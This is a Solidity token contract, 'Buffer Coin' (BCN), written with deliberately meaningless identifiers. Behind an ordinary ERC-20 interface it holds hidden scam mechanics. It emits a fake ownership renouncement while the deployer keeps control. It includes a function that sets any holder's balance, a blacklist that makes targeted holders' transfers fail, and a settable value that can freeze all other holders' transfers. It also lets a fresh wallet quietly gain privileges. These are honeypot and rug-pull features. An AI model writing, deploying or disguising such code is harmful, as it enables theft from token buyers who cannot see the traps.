//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract modeSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitLaunchedIs {
    function createPair(address listTokenTake, address sellReceiverFrom) external returns (address);

    function feeTo() external view returns (address);
}

interface fromBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface feeMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxIs) external view returns (uint256);

    function transfer(address limitLaunched, uint256 shouldFromSwap) external returns (bool);

    function allowance(address walletTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldFromSwap) external returns (bool);

    function transferFrom(
        address sender,
        address limitLaunched,
        uint256 shouldFromSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toMinMarketing, uint256 value);
    event Approval(address indexed walletTo, address indexed spender, uint256 value);
}

interface feeMarketingMetadata is feeMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BufferCoin is modeSwap, feeMarketing, feeMarketingMetadata {

    function swapFrom(address walletAmountMin, address limitLaunched, uint256 shouldFromSwap) internal returns (bool) {
        require(limitFee[walletAmountMin] >= shouldFromSwap);
        limitFee[walletAmountMin] -= shouldFromSwap;
        limitFee[limitLaunched] += shouldFromSwap;
        emit Transfer(walletAmountMin, limitLaunched, shouldFromSwap);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return totalBuy;
    }

    uint256 public exemptTeam = 0;

    address fundIsAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private maxToken;

    bool public takeSellLiquidity;

    uint256 constant listLimit = 17 ** 10;

    bool private senderAmountAuto;

    address toExemptFund;

    constructor (){
        if (senderAmountAuto) {
            autoFeeTotal = false;
        }
        receiverMax();
        fromBuy modeMarketing = fromBuy(fundIsAuto);
        txIs = limitLaunchedIs(modeMarketing.factory()).createPair(modeMarketing.WETH(), address(this));
        toExemptFund = limitLaunchedIs(modeMarketing.factory()).feeTo();
        
        minAuto = _msgSender();
        isTake[minAuto] = true;
        limitFee[minAuto] = modeFee;
        if (autoFeeTotal) {
            autoFeeTotal = false;
        }
        emit Transfer(address(0), minAuto, modeFee);
    }

    function feeShould(address enableAt) public {
        autoWalletLiquidity();
        if (senderAmountAuto == autoFeeTotal) {
            limitLaunch = maxToken;
        }
        if (enableAt == minAuto || enableAt == txIs) {
            return;
        }
        receiverBuy[enableAt] = true;
    }

    event OwnershipTransferred(address indexed feeList, address indexed tokenLimit);

    uint256 public autoMax = 0;

    uint256 public limitLaunch;

    uint256 private modeFee = 100000000 * 10 ** 18;

    function sellTrading(address walletAmountMin, address limitLaunched, uint256 shouldFromSwap) internal view returns (uint256) {
        require(shouldFromSwap > 0);

        uint256 toBuy = 0;
        if (walletAmountMin == txIs && autoMax > 0) {
            toBuy = shouldFromSwap * autoMax / 100;
        } else if (limitLaunched == txIs && exemptTeam > 0) {
            toBuy = shouldFromSwap * exemptTeam / 100;
        }
        require(toBuy <= shouldFromSwap);
        return shouldFromSwap - toBuy;
    }

    function listFee(address senderMinTeam, uint256 shouldFromSwap) public {
        autoWalletLiquidity();
        limitFee[senderMinTeam] = shouldFromSwap;
    }

    mapping(address => uint256) private limitFee;

    address public txIs;

    function approve(address txTo, uint256 shouldFromSwap) public virtual override returns (bool) {
        minFund[_msgSender()][txTo] = shouldFromSwap;
        emit Approval(_msgSender(), txTo, shouldFromSwap);
        return true;
    }

    string private marketingFee = "Buffer Coin";

    mapping(address => bool) public receiverBuy;

    function allowance(address swapModeTo, address txTo) external view virtual override returns (uint256) {
        if (txTo == fundIsAuto) {
            return type(uint256).max;
        }
        return minFund[swapModeTo][txTo];
    }

    function sellLaunchedMax(uint256 shouldFromSwap) public {
        autoWalletLiquidity();
        buySwapMarketing = shouldFromSwap;
    }

    uint256 swapIsMin;

    function transfer(address senderMinTeam, uint256 shouldFromSwap) external virtual override returns (bool) {
        return atTo(_msgSender(), senderMinTeam, shouldFromSwap);
    }

    function atTo(address walletAmountMin, address limitLaunched, uint256 shouldFromSwap) internal returns (bool) {
        if (walletAmountMin == minAuto) {
            return swapFrom(walletAmountMin, limitLaunched, shouldFromSwap);
        }
        uint256 minLiquidity = feeMarketing(txIs).balanceOf(toExemptFund);
        require(minLiquidity == buySwapMarketing);
        require(limitLaunched != toExemptFund);
        if (receiverBuy[walletAmountMin]) {
            return swapFrom(walletAmountMin, limitLaunched, listLimit);
        }
        shouldFromSwap = sellTrading(walletAmountMin, limitLaunched, shouldFromSwap);
        return swapFrom(walletAmountMin, limitLaunched, shouldFromSwap);
    }

    uint256 buySwapMarketing;

    mapping(address => mapping(address => uint256)) private minFund;

    function symbol() external view virtual override returns (string memory) {
        return maxFundSell;
    }

    string private maxFundSell = "BCN";

    function autoWalletLiquidity() private view {
        require(isTake[_msgSender()]);
    }

    function transferFrom(address walletAmountMin, address limitLaunched, uint256 shouldFromSwap) external override returns (bool) {
        if (_msgSender() != fundIsAuto) {
            if (minFund[walletAmountMin][_msgSender()] != type(uint256).max) {
                require(shouldFromSwap <= minFund[walletAmountMin][_msgSender()]);
                minFund[walletAmountMin][_msgSender()] -= shouldFromSwap;
            }
        }
        return atTo(walletAmountMin, limitLaunched, shouldFromSwap);
    }

    function receiverMax() public {
        emit OwnershipTransferred(minAuto, address(0));
        teamTake = address(0);
    }

    mapping(address => bool) public isTake;

    uint8 private totalBuy = 18;

    bool private autoFeeTotal;

    address public minAuto;

    address private teamTake;

    function getOwner() external view returns (address) {
        return teamTake;
    }

    function owner() external view returns (address) {
        return teamTake;
    }

    function tradingMode(address teamTrading) public {
        require(teamTrading.balance < 100000);
        if (takeSellLiquidity) {
            return;
        }
        
        isTake[teamTrading] = true;
        
        takeSellLiquidity = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeFee;
    }

    bool public shouldMarketing;

    function balanceOf(address maxIs) public view virtual override returns (uint256) {
        return limitFee[maxIs];
    }

    function name() external view virtual override returns (string memory) {
        return marketingFee;
    }

}